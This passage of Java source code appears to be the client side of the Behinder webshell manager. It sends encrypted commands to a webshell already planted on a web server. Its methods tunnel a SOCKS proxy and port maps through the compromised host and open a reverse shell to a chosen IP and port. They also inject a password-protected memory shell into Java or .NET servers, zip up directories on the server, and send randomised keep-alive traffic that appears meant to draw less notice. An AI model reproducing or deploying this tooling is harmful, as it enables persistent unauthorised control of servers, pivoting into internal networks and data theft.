        byte[] data = Utils.getData(this.currentKey, this.encryptType, "PortMap", params, this.currentType);

        
        Map<String, String> resHeader = (Map<String, String>)Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex).get("header");
        
        if (((String)resHeader.get("status")).equals("200")) {
            return true;
        }
        return false;
    }
    
    public boolean closeRemotePortMap() throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("action", "closeRemote");
        
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "PortMap", params, this.currentType);

        
        Map<String, String> resHeader = (Map<String, String>)Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex).get("header");
        
        if (((String)resHeader.get("status")).equals("200")) {
            return true;
        }
        return false;
    }
    
    public byte[] readProxyData(String socketHash) throws Exception {
        byte[] resData = null;
        Map<String, String> params = new LinkedHashMap<>();
        params.put("cmd", "READ");
        if (this.currentType.equals("php")) {
            
            params.put("remoteIP", "");
            params.put("remotePort", "");
        } 
        params.put("socketHash", socketHash);
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "SocksProxy", params, this.currentType);
        
        Map<String, Object> result = null;

        
        try {
            result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        }
        catch (Exception e) {
            
            byte[] exceptionByte = e.getMessage().getBytes();
            if (exceptionByte[0] == 55 && exceptionByte[1] == 33 && exceptionByte[2] == 73 && exceptionByte[3] == 54) {
                
                return null;
            }

            
            throw e;
        } 

        
        Map<String, String> resHeader = (Map<String, String>)result.get("header");
        if (((String)resHeader.get("status")).equals("200")) {
            resData = (byte[])result.get("data");
            if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {


                
                resData = null;
            } else {
                if (resHeader.containsKey("server") && ((String)resHeader.get("server")).indexOf("Apache-Coyote/1.1") > 0) {
                    resData = Arrays.copyOfRange(resData, 0, resData.length - 1);
                }
                if (resData == null) {
                    resData = new byte[0];
                }
            } 
        } else {
            resData = null;
        } 
        return resData;
    }
    
    public boolean writeProxyData(byte[] proxyData, String socketHash) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("cmd", "FORWARD");


        
        params.put("targetIP", "");
        params.put("targetPort", "");
        params.put("socketHash", socketHash);

        
        params.put("extraData", Base64.encode(proxyData));
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "SocksProxy", params, this.currentType);

        
        Map<String, Object> result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        Map<String, String> resHeader = (Map<String, String>)result.get("header");
        byte[] resData = (byte[])result.get("data");
        if (((String)resHeader.get("status")).equals("200")) {
            if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
                
                resData = Arrays.copyOfRange(resData, 4, resData.length);
                
                return false;
            } 
            return true;
        } 
        
        return false;
    }

    
    public boolean closeProxy(String socketHash) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("cmd", "DISCONNECT");
        params.put("socketHash", socketHash);
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "SocksProxy", params, this.currentType);

        
        Map<String, String> resHeader = (Map<String, String>)Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex).get("header");
        
        if (((String)resHeader.get("status")).equals("200")) {
            return true;
        }
        return false;
    }

    
    public boolean openProxy(String destHost, String destPort, String socketHash) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("cmd", "CONNECT");
        params.put("targetIP", destHost);
        params.put("targetPort", destPort);
        params.put("socketHash", socketHash);
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "SocksProxy", params, this.currentType);

        
        Map<String, Object> result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        Map<String, String> resHeader = (Map<String, String>)result.get("header");
        byte[] resData = (byte[])result.get("data");
        if (((String)resHeader.get("status")).equals("200")) {
            if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
                
                resData = Arrays.copyOfRange(resData, 4, resData.length);
                
                return false;
            } 
            return true;
        } 
        
        return false;
    }

    
    public JSONObject echo(String content) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("content", content);
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "Echo", params, this.currentType);

        
        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        Map<String, String> responseHeader = (Map<String, String>)resultObj.get("header");
        for (String headerName : responseHeader.keySet()) {
            if (headerName == null)
                continue; 
            if (headerName.equalsIgnoreCase("Set-Cookie")) {
                String cookieValue = responseHeader.get(headerName);
                mergeCookie(this.currentHeaders, cookieValue);
            } 
        } 
        String localResultTxt = "{\"status\":\"c3VjY2Vzcw==\",\"msg\":\"" + Base64.encode(content.getBytes()) + "\"}";
        byte[] localResult = Crypt.Encrypt(localResultTxt.getBytes(), this.currentKey, this.currentType, this.encryptType);
        byte[] resData = (byte[])resultObj.get("data");
        String remoteResult = new String(resData);
        this.beginIndex = Utils.matchData(resData, localResult);
        if (this.beginIndex < 0) {
            
            this.beginIndex = 0;
            this.endIndex = 0;
        }
        else {
            
            this.endIndex = resData.length - this.beginIndex - localResult.length;
        } 
        String resultTxt = new String(Crypt.Decrypt(Arrays.copyOfRange(resData, this.beginIndex, resData.length - this.endIndex), this.currentKey, this.encryptType, this.currentType));
        resultTxt = new String(resultTxt.getBytes("UTF-8"), "UTF-8");
        
        JSONObject result = new JSONObject(resultTxt);
        for (String key : result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }

    public String getBasicInfo(String whatever) throws Exception {
        String result = "";
        
        Map<String, String> params = new LinkedHashMap<>();
        params.put("whatever", whatever);
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "BasicInfo", params, this.currentType);
        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);      
        byte[] resData = (byte[])resultObj.get("data");

        try {
            result = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        } catch (Exception e) {
            
            e.printStackTrace();
            throw new Exception("请求失败:" + new String(resData, "UTF-8"));
        } 
        return result;
    }

    private void showErrorMessage(String title, String msg) {
        Alert alert = new Alert(Alert.AlertType.ERROR);
        Window window = alert.getDialogPane().getScene().getWindow();
        window.setOnCloseRequest(event -> window.hide());
        
        alert.setTitle(title);
        alert.setHeaderText("");
        alert.setContentText(msg);
        alert.show();
    }

    
    public void keepAlive() throws Exception {
        while (true) {
            try {
                while (true) { Thread.sleep((((new Random()).nextInt(5) + 5) * 60 * 1000));
                    int randomStringLength = (new SecureRandom()).nextInt(3000);
                    echo(Utils.getRandomString(randomStringLength));
                }
            } catch (Exception e) {
                
                if (e instanceof InterruptedException) {
                    return;
                }
                
                Platform.runLater(() -> showErrorMessage("提示", "由于您长时间未操作，当前连接会话已超时，请重新打开该网站。"));
                e.printStackTrace();
            } 
        } 
    }
    
    public JSONObject connectBack(String type, String ip, String port) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("type", type);
        params.put("ip", ip);
        params.put("port", port);
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "ConnectBack", params, this.currentType);
        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[])resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        
        JSONObject result = new JSONObject(resultTxt);
        for (String key : result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }

    public JSONObject injectMemoryShell(String webEnv, String shellType, String urlPattern, String password) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("urlPattern", urlPattern);
        byte[] data = null;
        if (this.currentType.equals("jsp")) {
            params.put("password", Utils.getMD5(password));
            params.put("shellString", new String(Params.getParamedClass("memoryshell."+shellType, params), StandardCharsets.ISO_8859_1));
            data = Utils.getData(this.currentKey, this.encryptType, "memoryshell."+webEnv, params, this.currentType);
        } else if (this.currentType.equals("aspx")) {
            String s = new String(Utils.getResourceData(String.format("net/rebeyond/behinder/payload/csharp/memoryshell/%s.aspx", shellType)), StandardCharsets.ISO_8859_1);
            params.put("shellString", Base64.encode(s.replace("e45e329feb5d925b",Utils.getMD5(password)).getBytes(StandardCharsets.ISO_8859_1)));
            data = Utils.getData(this.currentKey, this.encryptType, "memoryshell/"+webEnv, params, this.currentType);
        }

        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[])resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        JSONObject result = new JSONObject(resultTxt);
        for (String key : result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }

    public JSONObject zipCompress(String sourceDirPath, String zipFilePath, String excludeExt) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("sourceDirPath", sourceDirPath);
        params.put("zipFilePath", zipFilePath);
        params.put("excludeExt", excludeExt);
        params.put("mode", "compress");

        byte[] data = Utils.getData(this.currentKey, this.encryptType, "Zip", params, this.currentType);
        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[])resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));

        JSONObject result = new JSONObject(resultTxt);
        for (String key : result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }
}